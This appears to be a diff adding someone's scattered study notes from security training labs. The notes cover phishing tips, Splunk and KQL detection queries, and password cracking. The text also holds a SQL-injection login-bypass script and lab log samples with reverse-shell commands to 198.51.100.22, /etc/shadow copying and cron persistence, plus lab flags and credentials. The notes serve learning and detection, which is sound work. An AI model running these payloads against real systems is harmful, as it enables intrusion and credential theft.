@@ -1,0 +1,218 @@
+
+- postman
+- bloodhound
+
+The first S.T.O.P. is from All Things Secured, which tells users to ask the following questions before acting on an email:
+
+    Suspicious?
+    Telling me to click something?
+    Offering me an amazing deal?
+    Pushing me to do something now?
+
+The second S.T.O.P. reminds users to follow the following instructions:
+
+    Slow down. Scammers run on your adrenaline.
+    Type the address yourself. Don’t use the message’s link.
+    Open nothing unexpected. Verify first.
+    Prove the sender. Check the real From address/number, not just the display name.
+
+
+
+>> malicious actors often hide code and data using a technique called "obfuscation".
+Obfuscation is the practice of making data hard to read and analyze. Attackers use it to evade basic detection and delay investigations. 
+
+============
+setoolkit
+===
+- Splunk
+index=main sourcetype=web_traffic   
+index=main sourcetype=web_traffic | timechart span=1d count by host
+index=main sourcetype=web_traffic host=lab client_ip="198.51.100.55" |  table _time, path, user_agent, status
+sourcetype=firewall_logs src_ip="10.10.1.5" AND dest_ip="198.51.100.55" AND action="ALLOWED" | table _time, action, protocol, src_ip, dest_ip, dest_port, reason
+sourcetype=firewall_logs src_ip="10.10.1.5" AND dest_ip="198.51.100.55" AND action="ALLOWED" | stats sum(bytes_transferred) by src_ip
+
+------------------------------------------------------------------------
+pdfcrack -f flag.pdf -w /usr/share/wordlists/rockyou.txt 
+
+# Cracking a zip
+zip2john flag.zip > ziphash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt
+
+
+Binaries and aliases: john, hashcat, fcrackzip, pdfcrack, zip2john, pdf2john.pl, 7z, qpdf, unzip, 7za, perl invoking pdf2john.pl.
+Command‑line traits: --wordlist, -w, --rules, --mask, -a 3, -m in Hashcat, references to rockyou.txt, SecLists, zip2john, pdf2john.
+Potfiles and state: ~/.john/john.pot, .hashcat/hashcat.potfile, john.rec.
+
+========================================
+import requests
+
+# Set up the login credentials
+username = "alice' OR 1=1 -- -"
+password = "test"
+
+# URL to the vulnerable login page
+url = "http://MACHINE_IP:5000/login.php"
+
+# Set up the payload (the input)
+payload = {
+    "username": username,
+    "password": password
+}
+
+# Send a POST request to the login page with our payload
+response = requests.post(url, data=payload)
+
+# Print the response content
+print("Response Status Code:", response.status_code)
+print("\nResponse Headers:")
+for header, value in response.headers.items():
+    print(f"  {header}: {value}")
+print("\nResponse Body:")
+print(response.text)
+
+============================
+IDOR
+
+https://www.uuidtools.com/decode
+37f0010f-a489-11f0-ac99-026ccdf7d769
+
+============================
+
+3aster_15_th3_n3w_xm45
+THM{4ll_s3rvice5_d1sc0vered}
+Christmas THM{XMAS_IS_COMING__BACK}
+
+Typosquatting/Punycodes
+===============================
+
+curl -A "internalcomputer" http://10.49.132.70/ua_check.php
+curl -I -A "internalcomputer" http://10.49.132.70/ua_check.php
+curl -i -A "internalcomputer" http://10.49.132.70/ua_check.php
+
+azureuser@321
+AzUrE@332211
+azureuser
+
+Global VNet Peering << between different regions, like eus<==>wus, etc
+Reginal VNet Peering << same azure region
+
+
+=======================
+set query_now = datetime(2025-12-12T05:09:25.9886229Z);
+Syslog_CL
+| where host_s == 'app-02'
+| project _timestamp_t, host_s, Message
+
+
+
+set query_now = datetime(2025-12-12T05:09:25.9886229Z);
+Syslog_CL
+| where program_s == 'kernel' and Message has "insert_module"
+| project _timestamp_t, host_s, Message
+
+>> Rules
+Syslog_CL | where Message has 'polkit' and Message has 'exploit' or Message has 'authority' | project TimeGenerated, host_s, Message
+Syslog_CL | where program_s == 'kernel' and Message has 'insert_module' | project TimeGenerated, host_s, Message
+Syslog_CL | where program_s == 'passwd' | where Message has 'changed by root' | project TimeGenerated, host_s, Message
+Syslog_CL | where program_s == 'sudo' or program_s == 'sudo' | where Message has '/etc/shadow' or Message has 'chmod 4755' or Message has 'cp /etc/shadow' | project TimeGenerated, host_s, Message | order by TimeGenerated desc
+Syslog_CL | where Message has 'usermod' and Message has 'sudo' | extend target_user = extract(@"user\s+'([^']+)'", 1, Message) | project TimeGenerated, host_s, target_user, Message
+Syslog_CL | where program_s == 'sshd' or program_s == 'sshd' | where Message contains 'Accepted password for root' or Message contains 'Accepted publickey for root' | extend src_ip = extract(@'from\s+([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)', 1, Message) | where isnotempty(src_ip) and not(ipv4_is_private(src_ip)) | summarize FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated), Count=count() by src_ip, host_s, Message | order by LastSeen desc
+Syslog_CL | where program_s has 'cron' | where Message has '/etc/crontab' or Message has 'root' | project TimeGenerated, host_s, Message
+Syslog_CL | where Message has 'find / -perm -4000' or Message has 'suid' | project TimeGenerated, host_s, Message
+
+
+kernel: [625465] audit: type=1130 audit(1759996669:1161): id=622 op=insert_module name=malicious_mod.ko uid=0
+audit: type=1100 msg=audit(1760043498:1079): pid=2923 uid=0 auid=1028 ses=40 msg='cwd="/tmp" cmdline="/bin/echo 'setup' >> /etc/ld.so.preload"'
+CRON[1273]: (tom) CMD (echo '/bin/cp /etc/shadow /tmp/shadow.bak' >> /etc/crontab)
+CRON[5009]: (deploy) CMD (echo '/bin/echo 'setup' >> /etc/ld.so.preload' >> /etc/crontab)
+su: pam_unix(su:auth): authentication failure; logname=alice uid=1052 euid=1052 tty=/dev/pts/7 ruser=alice rhost=192.0.2.17 user=root
+
+sshd[9246]: Accepted password for root from 172.16.0.12 port 29302 ssh2
+sudo:   ops : TTY=pts/0 ; PWD=/home/ops ; USER=root ; COMMAND=/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1
+
+
+
+10/9/2025, 9:30:11.000 AM
+build-01
+su: pam_unix(su:auth): authentication failure; logname=alice uid=1090 euid=1090 tty=/dev/pts/9 ruser=alice rhost=172.16.0.12 user=root
+10/10/2025, 7:39:31.000 AM
+db-01
+su: pam_unix(su:auth): authentication failure; logname=alex uid=1026 euid=1026 tty=/dev/pts/8 ruser=alex rhost=198.51.100.22 user=root
+10/10/2025, 7:50:55.000 AM
+app-01
+CRON[1298]: (root) CMD (echo '*/5 * * * * root /bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1' >> /etc/crontab)
+10/10/2025, 7:53:08.000 AM
+ci-runner-01
+199.124.194.111
+sudo: serviceacct : TTY=pts/8 ; PWD=/home/serviceacct ; USER=root ; COMMAND=/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1
+10/10/2025, 7:54:31.000 AM
+ci-runner-02
+CRON[3560]: (alice) CMD (echo 'echo 'malicious' > /tmp/.hm' >> /etc/crontab)
+10/10/2025, 7:55:55.000 AM
+db-02
+167.38.167.62
+sshd[6910]: Accepted password for root from 198.51.100.22 port 8358 ssh2
+10/10/2025, 8:00:40.000 AM
+websrv-02
+su: pam_unix(su:session): session opened for user root by alex(uid=1017)
+10/10/2025, 8:17:41.000 AM
+ci-runner-02
+188.227.161.20
+audit: type=1100 msg=audit(1760023768:1160): pid=6432 uid=0 auid=1039 ses=50 msg='cwd="/tmp" cmdline="/bin/echo 'setup' >> /etc/ld.so.preload"'
+10/10/2025, 8:19:30.000 AM
+app-02
+usermod: user 'backupuser' added to group 'sudo' by uid=0 (usermod -aG sudo backupuser)
+10/10/2025, 8:27:42.000 AM
+db-01
+197.111.56.158
+pam_unix(sudo:session): session opened for user root by builder(uid=1032)
+10/10/2025, 8:33:53.000 AM
+jump-01
+sshd[9779]: Accepted password for root from 10.1.1.5 port 23250 ssh2
+10/10/2025, 8:47:41.000 AM
+app-02
+su: pam_unix(su:session): session opened for user root by alice(uid=1021)
+10/10/2025, 9:07:14.000 AM
+build-01
+152.17.210.210
+kernel: [280616] audit: type=1130 audit(1760025538:1231): id=747 op=insert_module name=malicious_mod.ko uid=0
+10/10/2025, 9:13:09.000 AM
+build-04
+173.31.137.2
+CRON[2200]: (adminuser) CMD (echo '/bin/cp /etc/shadow /tmp/shadow.bak' >> /etc/crontab)
+10/10/2025, 9:22:08.000 AM
+build-04
+sudo: root : TTY=pts/9 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/chown root:root /usr/local/bin/backup_helper; chmod u+s /usr/local/bin/backup_helper
+3s 375ms
+
+
+ >>>>>>> Splunk
+ ================
+index=windows_apache_access (cmd.exe OR powershell OR "powershell.exe" OR "Invoke-Expression") | table _time host clientip uri_path uri_query status
+index=windows_sysmon ParentImage="*httpd.exe"
+
+index=windows_sysmon Image="*powershell.exe" (CommandLine="*enc*" OR CommandLine="*-EncodedCommand*" OR CommandLine="*Base64*")
+
+ cmd=powershell.exe+-enc+VABoAGkAcwAgAGkAcwAgAG4AbwB3ACAATQBpAG4AZQAhACAATQBVAEEASABBAEEASABBAEEA
+
+ 
+ >> C2 Detection - Command & Carol
+ - RITA
+ - zeek
+
+
+
+SGVyZSBpcyB0aGUgcGFzc3dvcmQ6IFpUTjRjREI1VDNWd05ETmxUMlV4TlE9PQ==
+
+ZTN4cDB5T3VwNDNlT2UxNQ==
+===============
+
+
+
+
+
+
+
+
+
+https://c2.northpole.thm/exfil
